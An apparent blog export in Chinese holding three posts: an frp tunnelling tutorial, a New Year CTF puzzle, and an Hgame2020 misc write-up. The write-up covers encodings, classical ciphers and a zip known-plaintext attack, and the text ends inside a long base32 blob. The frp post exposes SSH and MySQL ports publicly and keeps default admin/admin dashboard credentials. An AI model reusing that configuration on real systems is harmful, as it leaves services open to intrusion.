比如Windows64位下载 frp_0.31.1_windows_amd64.zip， Linux64位一般是这个 frp_0.31.1_linux_amd64.tar.gz。 其他系统/架构的对应下载就好了。 将 frps 及 frps.ini 放到具有公网 IP 的机器上。 将 frpc 及 frpc.ini 放到处于内网环境的机器上。 服务器端的搭建可以在服务器上可以用wget下载。 sudo mkdir -p /etc/frp cd /etc/frp sudo wget \"https://github.com/fatedier/frp/releases/download/v0.31.1/frp_0.31.1_linux_amd64.tar.gz\" sudo tar xzvf frp_0.31.1_linux_amd64.tar.gz sudo mv frp_0.31.1_linux_amd64/* /etc/frp 然而国内下载速度感人，大概8M的文件就几KB/s… 于是还不如直接搭个梯子到外面下载好了再传到服务器上。 服务器端server嘛，当然用的是 frps 及 frps.ini。 完整版的 frps_full.ini里面有很详细的注释，也可以用来参考。 最简单的配置就直接这样写 # frps.ini [common] bind_port = 7000 然后**启动frps**（Linux下） /etc/frp/frps -c /etc/frp/frps.ini 再去把系统的防.火|墙打开，以及阿里云等平台的安全组规则设好允许入站出站。 这个firewall搞死我了emmm折腾了老半天最后发现没放行端口…… 后面再写一篇关于firewall配置的。 好了，下面到客户端。 客户端（内网主机）的搭建同理把frp解压的文件放到/etc/frp文件夹下。 客户端client，用的是 frpc 及 frpc.ini。 # frpc.ini [common] server_addr = x.x.x.x server_port = 7000 [ssh] type = tcp local_ip = 127.0.0.1 local_port = 22 remote_port = 7001 [Mysql] type = tcp local_ip = 127.0.0.1 #也可以是局域网中的内网IP local_port = 3306 remote_port = 7002 其中common里的server_addr是公网主机的公网IP，server_port设成与服务端一样的端口。 每个方框[.+]里的是name，下面都对应着一个规则，要求不能重名。 type可以是tcp/udp/http/https/stcp/xtcp（具体看官方文档），一般就tcp/http啦。 local_ip和local_port为本地地址及端口。 remote_port为公网的端口，这个可以在服务端进行限制，注意要在服务端放行这些端口啊！ 客户端可以在多个主机上运行，只要name不重名就行。 而后启动客户端 /etc/frp/frpc -c /etc/frp/frpc.ini Windows下： frpc.exe -c frpc.ini start proxy success表示启动成功。 远程访问现在就可以直接通过公网IP的7001端口访问内网的ssh，通过7002端口访问内网的Mysql啦！ 远程编程，访问网页，管理数据库什么的都可以实现啦！ 好棒呀！ 进阶Dashboardfrp的服务器端提供了一个在web端查看运行状态的展示界面。 配置如下，在common中添加如下信息： # frps.ini [common] dashboard_port = 7500 # 注意开放端口 # dashboard 用户名密码，默认都为 admin dashboard_user = admin dashboard_pwd = admin 而后重启服务端，就可以在http://[server_addr]:7500 访问 dashboard 界面，用户名密码默认为 admin。 还别说，挺好看的唉！ 看了一下，基于vue写的。 Admin UI在客户端也提供了一个类似于dashboard的查看状态和管理配置的界面。 # frpc.ini [common] admin_addr = 127.0.0.1 admin_port = 7400 admin_user = admin admin_pwd = admin 然后本地就可以通过 http://127.0.0.1:7400 来访问查看状态和修改配置了。 这里如果想通过内网IP（如192.168.1.66）查看的话，需要把admin_addr修改为 0.0.0.0（允许所有访问），或者对应的本地IP（如192.168.1.66）。 同时也需要在本地的firewall打开这个端口，否则在内网的其他主机也无法访问。（折腾了老半天才发现emmm 当然，想要在公网访问的话，把7400端口映射到外网就好了，不过安全起见算了吧。 开启加密、压缩在客户端加入use_encryption 和 use_compression这两个参数。 # frpc.ini [ssh] type = tcp local_port = 22 remote_port = 6000 use_encryption = true use_compression = true 开机自启这次直接把frp作为一个service好了，用systemd好了！ 服务端：新建一个文件，名叫 frps.service，写入 # frps.service [Unit] Description=Frp Server After=syslog.target network.target Wants=network.target [Service] Type=simple ExecStart=/etc/frp/frps -c /etc/frp/frps.ini ExecStop=/usr/bin/killall frps #启动失败1分钟后再次启动 RestartSec=1min KillMode=control-group #重启控制：总是重启 Restart=always [Install] WantedBy=multi-user.target 客户端：frpc.service # frpc.service [Unit] Description=Frp Client After=syslog.target network.target Wants=network.target [Service] Type=simple ExecStart=/etc/frp/frpc -c /etc/frp/frpc.ini ExecStop=/usr/bin/killall frpc #启动失败1分钟后再次启动 RestartSec=1min KillMode=control-group #重启控制：总是重启 Restart=always [Install] WantedBy=multi-user.target 而后将此文件放到 服务器端和客户端的**/etc/systemd/system/ 目录**下。 先killall frps（或frpc），再调用 sudo systemctl enable frps.service 或 sudo systemctl enable frpc.service 这样就成功配置了开机自启。 而且可以通过下列命令进行管理： sudo systemctl start frpc.service # 启动 sudo systemctl stop frpc.service # 停止 sudo systemctl restart frpc.service # 重启 sudo systemctl status frpc.service # 查看状态 frps同理。 Summaryfrp很强大的呢！ 比如还可以在一定情况下绕过服务器实现点对点P2P连接，不过前提是内网和你的设备两端都要装frpc客户端。 更多且看官方文档：https://github.com/fatedier/frp 关键这个配置起来贼方便啊！ 于是这样就可以通过公网IP，访问到你内网的资源啦，嘻嘻嘻~ 好了，完事！ 溜了溜了。 Reference 官方仓库及介绍 https://github.com/fatedier/frp 官方中文文档 https://github.com/fatedier/frp/blob/master/README_zh.md https://www.iplaysoft.com/frp.html Frp后台自动启动的几个方法 https://blog.csdn.net/x7418520/article/details/81077652 Systemd 服务管理教程 https://cloud.tencent.com/developer/article/1516125 小想法 | 基于VSCode和ssh实现远程编程/炼丹 还看到过一个免费的内网穿透服务，Sakura Frp https://www.natfrp.com/","path":"2020/01/29/Server_frp/"},{"title":"2020鼠年快乐！来玩红包闯关吧！","text":"鼠年快乐又是一年春来到，鼠年的钟声敲响了！ 鼠你健康，鼠你平安，鼠你快乐喵~ 这一年过的太难了，还要感谢大家的陪伴哈！ 最近新型冠状病毒感染的肺炎来了，公共场所都关闭了emmm 武汉加油！中国加油！ 过年了，大家都要健康快乐呀！ 红包闯关说到这个红包闯关，最开始是听说有学长的红包闯关，FJJ 学长也弄过一个，元旦的时候白师傅扔了个RSA的密码红包，Milkice 的年终总结里也出了道红包题。 反正就挺有意思的嘛23333 我的话其实元旦的时候就想弄了。 不过那时候一堆考试，去年12.31下午六点多才考完高频，后面又要考DSP，根本没空出题…… 所以，不如趁着春节出道题玩玩呀！ 题目来了就出个 Misc 的题吧，花了一番心思，做题看脑洞吧，可以好好玩玩！ 社会主义核心价值观深入人心，那我们就从这开始吧！ 自由诚信自由自由文明和谐文明自由爱国自由敬业和谐自由自由自由平等自由自由爱国自由敬业平等爱国平等 和谐和谐公正和谐和谐自由友善公正自由友善自由自由友善法治自由公正平等爱国平等爱国自由敬业和谐和谐 和谐和谐自由友善敬业平等富强自由平等平等爱国自由爱国平等民主和谐公正自由友善公正和谐文明自由公正 和谐平等自由友善自由平等自由自由法治平等民主和谐和谐平等和谐自由敬业平等公正和谐文明自由自由自由 诚信民主自由诚信文明和谐和谐自由平等自由友善敬业自由诚信自由平等自由自由法治平等民主和谐自由自由 友善公正自由友善法治自由友善法治平等公正和谐和谐平等法治平等法治平等敬业自由诚信文明自由诚信和谐 自由诚信自由自由友善自由平等法治自由法治平等法治平等友善自由平等自由自由平等自由友善爱国平等友善 自由平等爱国平等爱国自由法治自由友善公正和谐和谐平等自由自由友善法治平等友善自由平等公正自由法治 自由敬业和谐文明自由诚信文明平等富强自由法治自由诚信富强平等敬业平等自由自由法治和谐自由平等自由 自由诚信文明自由诚信自由平等文明平等自由自由法治自由和谐和谐和谐平等自由自由法治自由诚信和谐平等 文明平等法治自由自由平等法治和谐文明和谐和谐自由友善平等自由诚信和谐平等诚信富强平等法治自由法治 平等法治平等诚信富强自由友善公正自由友善平等自由友善法治平等友善自由平等法治自由自由平等法治平等 友善自由和谐和谐自由法治自由法治自由诚信和谐平等爱国平等平等自由和谐自由诚信和谐自由诚信文明平等 自由自由法治自由文明自由自由自由自由自由敬业和谐文明和谐和谐自由公正自由法治自由敬业平等诚信富强 平等自由自由法治自由友善法治平等友善自由平等自由自由公正和谐平等自由法治平等法治平等和谐平等敬业 自由友善公正平等富强自由公正平等友善自由平等平等自由爱国自由敬业和谐和谐自由诚信文明自由友善法治 总共有4个Flag，对应着4个Alipay红包。 形式都是 MIAO{.+} ，可能是 纯数字 或 纯汉字。 如果红包过期了，1月31日前直接私戳把flag发给我就好了喵！ 后面再发出题记录和WP。（咕咕咕 注意解出来的flag不要随便发给别人啊！！！ Hint闯关需要一关一关过嘛，可能有点难度，给点小提示吧。 套娃挺好玩的，比如这回一个文件里套了好几个，flag就越埋越深23333。 编码家族里，base64挺常用的，但别只想着它吧。哦对了，社会主义核心价值观也可以用来编码的呢。 喵喵偶尔会和小伙伴发邮件交流。 喵喵偶尔用PhotoShop修修图什么的，可能还会往图片里藏点什么有意思的东西，当然工具不只是PS。 十六进制编辑器在手，有可能哪天一不小心把文件改错了就打不开了或者说损坏了。 二维码是个好东西，能传递的信息不只是网址，还有……但是前提是你能找到它。 喵喵喜欢用Python来码代码，很多现成的库贼方便。而且编译后…… 中文的话有可能需要借助Unicode编码。 一步步深入还会有进一步的提示，备注是个好东西。 （我也不记得了，自己想吧2333 Just have fun！有问题欢迎留言，或者私戳呀！","path":"2020/01/25/CTF_2020HappyChineseNewYear/"},{"title":"CTF | Hgame2020 Week1 WriteUp","text":"前言这几天玩了玩杭州电子科技大学的Hgame2020，还别说，有点意思2333。 平台网址： https://hgame.vidar.club/ Flag格式：hgame{.+} 20200125 更新： 官方WP地址：https://github.com/vidar-team/Hgame2020_writeup MISC签到题Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t base64解码得到 .-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...-- 一看就是摩斯电码，加入分隔符后解码得到flag W3LC0ME_TO_2020_HGAM3 在线解密摩斯密码 www.atool9.com/morse.php 壁纸解压得到图片Pixiv@純白可憐.jpg，foremost提取得到一个zip压缩文件。备注提示 Password is picture ID. 本来还以为是在图片的文件里，而且还找到了一个id属性，然而并不是。 上网查了一下純白可憐，发现是P站画家，看了一篇介绍原来每张图片有个编号来着。 试了试百度搜图，出来的画风有点不对劲emmm。干脆直接上P站搜，然后在页面上找到了这张图。 （还别说，挺好看的哇，还是个中国画师喵。 天意 https://www.pixiv.net/artworks/76953815 得到ID 76953815，作为密码解压flag.txt（这么短还全数字，其实可以暴力破解的），得到 \\u68\\u67\\u61\\u6d\\u65\\u7b\\u44\\u6f\\u5f\\u79\\u30\\u75\\u5f\\u4b\\u6e\\u4f\\u57\\u5f\\u75\\u4e\\u69\\u43\\u30\\u64\\u33\\u3f\\u7d Unicode啦，转ASCII（用的是NATIVE转ASCII来着）得到flag hgame{Do_y0u_KnOW_uNiC0d3?} 克苏鲁神话明文攻击得到了解密后的zip文件。 得到加密的 The Call of Cthulhu.doc文件。根据 Bacon.txt文件提示寻找密码。 of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd. *Password in capital letters. 然而不成功，不知道怎么做下去了嘤嘤嘤。 &gt;&gt;&gt; s='of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd' &gt;&gt;&gt; s1=[i for i in s if i&gt;='A' and i&lt;='Z'] &gt;&gt;&gt; s1 ['S', 'C', 'G', 'E', 'A', 'O', 'R', 'N', 'G', 'S', 'H', 'B', 'E', 'C', 'E', 'A', 'A', 'S', 'R', 'I', 'F', 'H', 'G', 'R', 'E', 'O', 'T', 'E', 'O'] &gt;&gt;&gt; ''.join(s1) 'SCGEAORNGSHBECEAASRIFHGREOTEO' 20200125 更新： 看了官方WP才知道Bancon指的是培根密码，我还以为是咸肉/熏猪肉来着。。 根据大小写转为a或b，比如小写为a，大写为b。 flag隐藏在最后emmm Ctrl+D把隐藏取消掉就看到了。 hgame{Y0u_h@Ve_F0Und_mY_S3cReT} 签到题ProPlusPassword.txt提示了 Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y h jnsxf qjFjf jnb rg fiyykwtbsnkm tm xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn. JRFVJYFZVRUAGMAI Three fences first, Five Caesar next. English sentense first, zip password next. 一开始还以为前面的是3个栅栏，后面的是5个凯撒，然后试了半天都不对。 突然一想应该是先栅栏再凯撒，一试果然。 先解密zip密码：栅栏得到JFARZGFVMVRAJUIY，凯撒得到密码 EAVMUBAQHQMVEPDT。解压得到 OK.txt。 同时上面的那句话同理解密得到 Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice. emmm不大理解，不管了。 看文件是Ook!编码，解密得到base32编码。 data:text;base32,NFLEET2SO4YEWR3HN5AUCQKBJZJVK2CFKVTUCQKBKFIUCQKBIVCUGQKZIFAUCRCPINCW6S2BIFAU6V2VNRCVCVSSGRXE6MTBKM3DIRKOO53UIMZPGB3DOV3ZINJVOOCHMNCTQ33LMJFXEQKPHBQSW3CBKNLC6MRTIFAUIKZVMM4WIQKBIRVWOQ2FIF3UCY2NIFIUCK2ZIFTUCOCBIZCECSKBKBDUCSKBMZGUCUKBJ5AUI2DHIFAUQN2ZJU2GKL3WNIXWINBQM5CTANJZOZHG2YLYLJQW6L2KMIYXGM3YJMYFIVRWK52G25LNMFYGMYKZF5GFUMKRHF3TMY2WLBQXC4DNOVLVO4KQPFLTSYSOHBJXIRJRMVWHEWTSOBWXCWBSNVIHSMTEKVIGGT3OIZLDE4LRLJZGY3DRNI4GY5SXPJTEK4SSJZMHAYJSME3FU4LMHFYGUODUNZLEIM2EOB4FMZDROFWWCNK2MFXS6STCGFZTG6CLGBKFMNSXORWXK3LBOBTGCWJPJRNDCUJZO43GGVSYMFYXA3LVK5LXCUDZK44WETRYKN2EKMLFNRZFU4TQNVYVQMTNKB4TEZCWJ5FU66BRNRXHON2OJRAXGVLVOR5HGTCJMJ3XMNLNFNVUE2SDFM3XC3LHPFCVKTLOGBUE2WKUGNSFKMCIKF4WQ2ZLNNFGSQ2PF5ZG2ZZWI5KU22RQNBRVCUJTORRTCSCRPFUGWT3LJRUVGRZYOIZHGNSHIVEWQMDYMNJVCM3IMYYTGULXNBCUW3KMPFJUOOCMGZ2TMV2BJFUFK6DGKNAXU2DGKYZVIR2XHBEXCULUGBIXAOCPPJLEU6BXKVRDGRCPKI4WI2LEJZDGMYKFKBUDEYLQMVGGC2TFGRNHSUDWONKHA33RG5AWYOKPNJJEY6DCKVRDGVCPKE4TS3LEJZDFQWKFF5YDAYKKMFFWC6TFGZNHSRDWON5HI4DROJAW4OKPNZIUYQSYLBRG4VCQKFHDK3TEHFFFKWKVF5XTANSGLJFXCN3EGZFDMQTWJUXXK4CLNZBW45CDNZITOTSVLBGHMUSQKFHDK3RZGFFFKNCVHFXVKK2ILJYW2NDEOFHDOQTWJEVXKNKPNVBW45CDNZ3TOTSVNZEHIUTWMNGTKSBRGJFDAMCWHFXVCK2ILJYWYNDUOFHDO2DOJEVSW6CPNVUXC43VNM4TC6TUKJDGGMTJNVZEMODEJQZVMTZSGMYTESRQGBLFM5BSNZHW2ZTRN5VGWMCVHFQXM2TQMM3HAKZQFN2TKT3NINYXM5KVGUYHUZDEIVRW22LOOJLDQZCMNZSE4MTOHEYUUVJUKZLDSNTOJ5WWE4DPIRZTEVJZMF3GU4DDGVYHKOBPOVYEW3SDOF3HIVJVGB4GITSJMRWXS5TSKY4FMTDOORHDC3TEHFFFKWLEKY4XC3SPNVGHA4CEJUZFQOJWNZUXAYZZOJ2XG6TUOBYXERDRKB2FKNKVPBTE4322NV4WM3SXHAYUI3DUHE4W2ZCOIZLFSZC2F5YW4S3NJQ2XIQSNK5RDQNSYOVYWG5DWOZZVI4DPOFZEY4CQMRRTOVKSLBHG64DRPBTEQUZZGFKHI5BZMRUWITSGKZRGI4D2OBXDM4KJGVHEMUCXOI2DMWCPOFTHIUDSOVKHAZ3SOI3HMTKXPBUDSSZWJY2WSQ2CNJBVGTKZMZJXK2TFLFTWOWLXNNVEOSBQOJXTG3KJJFDU2SSJPBUDSSZWJY2WSQ2CNJBVGTKZMZJXK2TFLFTWOWLXNNVEOSBQOJXTG3KJJFDU2SSJPBUDSSZWJY2WSQ2CNJBVGTKZMZJXK2TFLFTWOWLXNNVEOSBQOJXTG3ZUGNUEOULDM4YG6MKOIRMGIZCTKZZG6UKSIRFUCUSEOFAU4RDRIFDEIS2BKJCHCQKOIRYUCRSEJNAVERDRIFHEI4KBIZCEWQKSIRYUCTSEOFAUMRCLIFJEI4KBJZCHCQKGIRFUCUSEOFAU4RDRIFDEIS2BKJCHCQKOIRYUCRSEJNAVERDRIFHEI4KBIZCEWQKSIRYUCTSEOFBUQYKFI42TKM2ZJZ4UOSLDPFLHESTNOQ3XU5DFKNFHK2TCNFYHGWDCNJFVOTLMMEZWETBSGU2G4NDUMFEW26DQOJHDKNDZKZZEU3LUG55HIZKTJJ2WUYTJOBZVQYTKJNLU23DBGNREYMRVGRXDI5DBJFWXQ4DSJY2TI6KWOJFG25BXPJ2GKU2KOVVGE2LQONMGE2SLK5GWYYJTMJGDENJUNY2HIYKJNV4HA4SOGU2HSVTSJJWXIN32ORSVGSTVNJRGS4DTLBRGUS2XJVWGCM3CJQZDKNDOGR2GCSLNPBYHETRVGR4VM4SKNV2DO6TUMVJUU5LKMJUXA42YMJVEWV2NNRQTGYSMGI2TO3RZOBTHOQ3TMN3WYYSVGUVW4VDQIFTCWQTVNNKWWSDXINDUCTRZIEZVGS2TIR3UERDHI4VWOYTIJBFEENCBNB3UIZCROQ2GU22BHBAVCNCCOVXVOMCUPFAVOQKJHBATGVKMKNGDKQKEIFCSWQLCOFDHARRYIFBGOQ3GIFHDC2JQM4VUCQLXIJ3HISBLOAVUUMSZLFRGYU2GGFQWYN3CMRSWU2DJJJSTSMRZGU3HI2CTJBMSWMKUK42WK2CUK5NHG2SWOZFHKZBLF5NFO2DJIN3FKOLMLBMTIK3MMJKTKWLJLB3GI5TFMVZFSVLIGJIHIVJROVMG6VJRNVRESMLCPFRG4ZTWGJLG6WLHOIYVAWSWGJHVA4CXGFHVOSLMG4ZWEM3OOEZEMSLENI3VMTTCNQ3EMTS2NV4U4VZYNU2TGNZZNRQUOSKLHFKDEVTENJVDMVTUKRWGSSTFHEZDSNJWORUFGSCZFMYVIVZVMVUFIV22ONVFM5SKOVSCWL22K5UGSQ3WKU4WYWCZGQVWYYSVGVMWSWDWMR3GKZLSLFKWQMSQORKTC5KYN5KTC3LCJEYWE6LCNZTHMMSWOBUVCMKEI5UWQWLUHFDEEY3FNZKDGMCKGFIG4VCOKZZTOVLXNBFDSSKYKRJVQSDUGA4WIT3EKQ2TA6SWMJBTATJUKNSFGRRYGJWFEM3DKAZWM3SVJ5LE2MKXO52EIK2JNZKVEWCQOAYGIMKEMR5DKML2NRKE4MLTJFIWM2KKGEYFM6BWMRIGMULOKUVWITJRK55HIVCDIVXDA2DEJZFGGZJTKQYTANJRKBXFITSWONGFC6TIJIYUSWD2MFLEQZDXF5SCWZCRGVKXUVTCIMYFANDJMRJEMYZLNZJDGVKOGNIG4WCPKZGTGV3XNBBCWSLOLBJFQSDQGA4TSQ3EKQ2TA6SWMJHTCTTHGFBFGZSLM5GECTLXGVEFE33QON5FUSCXOVMEKM2ZIRIXS2BWIRVDEVKKJUVXATZZLF2UUK3XI5UGYRBQJBEG632TLI2VIZBWPBSFI5DHJZCEWSDPJ5TFEULLNJ4W4N3MNE3W4TCBMJDUKTCSMMVWS2CKJBWE6M3CIYZE6V2FGNGUSU3JGU4UERCTMZFWG5LNKB2GG42KOVMUC2CGPI3EOSDLOVITKZDDMZQTKWKUMR3UEQ2LNZVU2UCKMNWHUNTPGYYXS53NG5TVGRKVKBMWGZKTOBGG4MKCGFZGY6COGJATATLPMVTTIOLMINKFA4KUOZLUY2LGONJHM5LWPE4XKRTIKI3UWYTNGNFHAR3RMJXEITRRPJ5EGRKJLFHEWSTMLBRDKSTZOBSTIWLIIRBGYVKNOFXGCSTVMRGTGVCNJVMWG2LHNNVW4VSONJWG4NTQGVUEGRKNI5WFK6LRORZWWNKVF5RU2ULYM54XCR2SKN2FKM2PNVRHA3SHJVFVCUKTK5KHC3JRPF5HIUJZO54EGR2EINYVUVSHGJKGGNTCOVDVSWLXLJDEISTQI5YWE3SEJYYXU6SDIVEVSTSLJJWFQYRVJJ4XAZJTMFHESVDIKE4XA3JYGNATM22TPB2DQ6CFN53UERCNLFIWQMCZO5XHG52CIRGVSULIGBMXO3TTO5BEITKZKFUDAWLXNZZXOQSEJVMVC2BQLF3W443XIJCE2WKRNAYFS53OON3UERCNLFIWQMCZO5XHG52CIRGVSULIGBMXO3TTO5BEITKZKFUDAWLXNZ2GSRCVJBNGORCMK5BWGZDQI5MHA332NBHTAVSXJNNFKM3DIR4WY2JXHBJHQRCUGE3WCMKKO5XGCS3WIVGXCZTVIJYFG6DEOVGTK2DQGY4HIS3LGVKDSQSXNFLVMTZTKEYG6WJLGNDWG53XHFSVO3CUMM2TMZ3SKJGEY3SMN5RFKTLCMFVGKY2ZMV3EYU3QOVMTQUKWONWGY2TMGFHDMQ2NORJHMUCNMZKGW4CVGNHGKWKLGJJWS6D2GZWTKQKHK5ZTG3TNKBXXSVLVMJWXMTKFMJNFMWJVORKGIZ2EJRLWE2T2JAYEUT2YJZVFQ3SDMRXXC43DPFYHK52GNRZE4MJUNJYUK3SMGIYXC6TIJ4YFMV2LLJKTGY2EPFWGSNZYKJ4EIVBRG5QTCSTXNZQUW5SFJVUWI3CZMQYU43TQIJKHSWCUJZWE2Z2QKJQXQSBWOA2WQQ2FJVDTCWRTKRXVU22TFNQUOSJZKVVGITLXPBUHSS2DGZRXU3ZQKV4USL2GJRCWK4KYOVDUSULXLJLEQZCPNAZFUSZVJFRWSMLJJYYXU6SDIVEVSUDRPJ2W4UKUJFXDQVKNKI3HATZULJUGUQTLKVHDANKILJXXA22SFNFVOSJPKVIGGTKRNBTXS4KPGZSEITLZLB4VC6CIOJVWE4DOI5GUWUKRLBMG4ZCHNFWVESBUN5MWUMKTHF3XQRCHIRFW6N3QO5HXUWSUJFCDAV3TKIVXCZKZKFUEIQTUK5SDANSHLJCXM3LINFIFMSJTMJIDEWBVMRIEKTZSI5XE23RRMQ4WKMKXHFZVET3BLBBE2SKSNJRWSYSYMY4DC6CZM5TVSULLOJHTKUDROZHVKNCNIFKU4SLZLJWGGL32LBEGSU2GM5BUG2ZVNMVXKLZVNJTXQQSBO5UEUV3EPEXWIY3DJI2GCQKJMFKGWVCLG4XW25KQIVCUIQ2FNRFHUSRZKY4XU3SCM5BWQ4CDKNGTO3RLME2DI6RRKJBW2RBYOJ4EQUCVNY2SW6LVGY2FGWSPHBAVC2DJPJEDSST2MRSFUMDXMN3WGWLXOBCGY3KKGZ5HKNRUKRNHKNCBKF4GS6KIJZHHUZDUMQYXO43XMRMUC2CENRWU4NT2OU3DMVDQNE2UC53YNB4UQSSNPI4WYZBRO5VXUZBUIFUEIRTNJ43FI3JXGZ5HA2BVM42HO2CDJBGE2VBRNZSDCMDOPJHHOQTINJBGWT3BMJXDOSZXOJUEU2ZXO5BEGR2MJVTDA3SOGEYW4VCCPJBDKNTTIY4EG2JPKZRGENKQOBKDMM3RGFITIVZRLBTTERZYIZ2HI2ZLORIHEULUIRBUCQSEFNFTEMTZMZLW4MLPKVUEESKBNAXUMYTCGVIHAVBWHBEVCQLTIFIWM4LUORRXMMTQMRLUKSKBK5AUS5RZKUZHKZRXKV2WUQ2FIFCEGRJTGJYWEWCIHFYVQUTIINAUE2SDMI3VMTTSNIVTCTDHO5UECQL2NB2DS33NGE2TSYLMHF3VC3CNJU4DIWCWOI2XGQSSNUYE4L3EK4ZHAYRXOZIEOOCSO5UU642ZOBUEUSDCKE3TSMLCK5WHM5JQFNRHQRCEJFQTK2TNIVXWG5CUNYYFMOLFK4VXEYRXOZCUKTLIG5UU6WKTOB4DCT3CKFMDCMLCGZ2HM5JYO5MXQSCPJE3GQ4LOIVKVU5CEMYZVM5DRK4VTO6TYOZCWGSLKOJDUWWKTKIZDATZPMRLTC4DCG52FA3JYKF3XSR3VLE2WQS2IJRKTKOKGMZMGY5TRGIVTO6CCIREWKNDKNVCXCY3EKRWTARRZMRLSW4TCG53E2R2NKJ5GST3PMFYHQRSHMJITGOJRMJQWY5TVHA4GE6CIINETM6DJNVCWWZDUIR3DGVTUMFLSWN2UGRSDI4LBKNSWOVDRFNUDANLVGJHXA5KVKV5EIT2FIJUG4RCXMNUXKNKSKRGU2NCRI5DWGTS2PFFTO3CGJV3XU2CBLFNHOMLOJFZHKVKVPJCE6RKCNBXEIV3DNF2TKUSUJVGTIUKHI5RU4WTZJM3WYRSNO55GQQKZLJ3TC3SJOJ2VKVL2IRHUKQTINZCFOY3JOU2VEVCNJU2FCR2HMNHFU6KLG5WEMTLXPJUECWK2O4YW4SLSOVKVO6TENNHFCTDNGN4WG2LUPJYXK5BTMFFHIYLGG5FG2M3GOF3GQU2HKU4WC3SNOFQTOZTPK4YXCL3DNVQWIZLVF5DG6WSRGFYWG6LQG5YCW2BXMFYDSU3EOIYXCMZPK5UGQQ2XLIXUW3SPOI3EQZDRNUYXAK3TK5RGMK3BGJCUSWSYGBYWGNTSOJSDE2LCK5XCW6K2OQZTM4RUKVUGYUCXOB5EW3LVGM3EM5DBOYZUU3LOLBZHM6DBI5KU4YLOJVYWKNTGN5STE4LGKVXGCOLBOQXTC32ZKFWG2ZTZOB5HCK3IGNQXA5DBMZZEM3JTF5WXI2CDI5LDSS3OJ5YTMM3EN5WTC4BPONWWEZBLOEVUMSLEIRXHOS3DNNSWKWKPJVAVINSIKBSVKSSNF5RUCWK2IFXCWT3FNN2VGWSPHBAVCNSIKBRVKNKJHBRXOY2ZIFXDET3FGBYVGWRLGRAVCNSEKBRVKOKKHBZXOZCZIFVDAT3FGRYFGWRWGVAXO6KCKBZWGOKKMNVXUZBUIFUDAT3FGRYHSURVGVTTI52CKBXWGOJVKFVXUOLXIJUGYRCVLJ5EY5LHFM3FS4BSOMZXQ5TGLJXFIUSWK5EFOZTZMJTU6ZLGKNUDGTSKNZSDSSSVLFSFMOKKOVGTMNKOI5EGG23VMYZVK3CUNBLFQM3NLF5HE22FMNTHS2JRHFSGSZCOIZLGEZC2PJFXKULYGU4UWTDGGAZFUMBQKZLGQMLOHBWTIRDONYYG6ZD2KNNDGZSTKZDUQVTGKNRGUT3VKRJGQM2KJRXDSMKKKU2FMVRZGVWU2NRVIJEEQODPORTFQWLOKRJFMVZTK5RXS4TLJVSWMU3JGM4U43LEJZDFMWLELIXUU5KBGU2TSS2IMMYHCY3KMFJXC4DHGNEWMWKOOJZDC3RLLBCSWNCFKEZWSULVOBCHKQJQPA3TGZTSOZRXGS3ELFAWOUCVNBTFGZSZIJYHEMLWF5MFKNRUIV3XU2CRMVYEG5LHHB3TOWCYOJ3DQ42KMQ2ES2CQIVUGIU2QMNBHA4RROUXVQYZVGRKTI53IIFSXAQZLNMVXOTCULBZGMODVJI4XOSTIOZAWOZCTJBSEENLKGJ2XMWDGGVMVCN3XKJAWK4CDGZVSW52EKRMHEZRLOU2XQ52KPBVEGZZZKNDGIQRZM4ZHK5SXMY2WGVBXNNJHCQ2MMM4HAV22JN2W45BQGFSWE3ZYGVYWGM2ZK5SDQSSTMFFVQRLTNNFU2MSSGUXVQNKPO52TOSKTNYYUK6KKLE2EKY3UKRXDM5SDLJXGIMSFNZIEWVTNKNUHOTBVJNVE4MDFMMYU6YTTJRHSWRLQJZLFA2KXINBEQYSZGQVXEODOLJMGIZ2KKQ3G2WSFONRUGT2XOB5DSSDMJZ5HKN2DKRXGQS32LJITIRTTNBJG2NSQKBQTGSRSIYZWEQ2VGJYW26CMIZAWU5DPMNTFMNSUOM3XK52FGU2VGTLZK5HUEWCMKU2XK2T2NVYHUZDILIZXO3CKN5YGGU3ZKFXXUWSINY4WM2ZTKA2FGQKJGREFC52DIFCHQZ2DIFEHUQKFIFCGOQJULFAUCQRYO5BECRBUM5BUKQLXIFRU2QKRIEVVSQLHIE4ECRSEIFEUCUBPO5AUM3ZQNBKVU4TIGFWUCQKBIFAUESSSKU2UK4TLJJTWOZZ5HU====== 再base32解密得到 iVBORw0KGgoAAAANSUhEUgAAAQQAAAEECAYAAADOCEoKAAAOWUlEQVR4nO2aS64ENwwD3/0v7WyCSW8GcE8okbKrAO8a+lASV/23AAD+5c9dAADkgCEAwAcMAQA+YAgA8AFDAIAPGAIAfMAQAOADhgAAH7YM4e/vj/d40gE059vNmaxZao/Jb1s3xK0TV6WtmumapfaY/LZ1Q9w6cVXaqpmuWWqPyW9bN8StE1elrZrpmqX2mPy2dUPcOnFV2qqZrllqj8lvWzfErRNXpa2a6Zql9pj8tnVD3DpxVdqqma5Zao/Jb1s3xK0TV6WtmumapfaY/LZ1Q9w6cVXaqpmuWWqPyW9bN8StE1elrZrpmqX2mPy2dVOKOx1lnw7NLAsUutzsLIbwv5m+kBjC+7qmgyEUMn0hMYT3dU0HQyhk+kJiCO/rmg6GUMj0hcQQ3tc1HQyhkOkLiSG8r2s6GEIh0xcSQ3hf13QwhEKmLySG8L6u6WAIhUxfSAzhfV3TGW8IqQt0Qp8OzVJx7Ub3DOR9didNFfaEPh2apeLaje4ZyPvsTpoq7Al9OjRLxbUb3TOQ99mdNFXYE/p0aJaKaze6ZyDvsztpqrAn9OnQLBXXbnTPQN5nd9JUYU/o06FZKq7d6J6BvM/upKnCntCnQ7NUXLvRPQN5n91JU4U9oU+HZqm4dqN7BvI+u5OmCntCnw7NUnHtRvcM5H12J00V9oQ+HZql4tqN7hnI++xOmiqsuk91ztRFc2imrF8dL3VO2312J00VVt2nOmfqojk0U9avjpc6p+0+u5OmCqvuU50zdd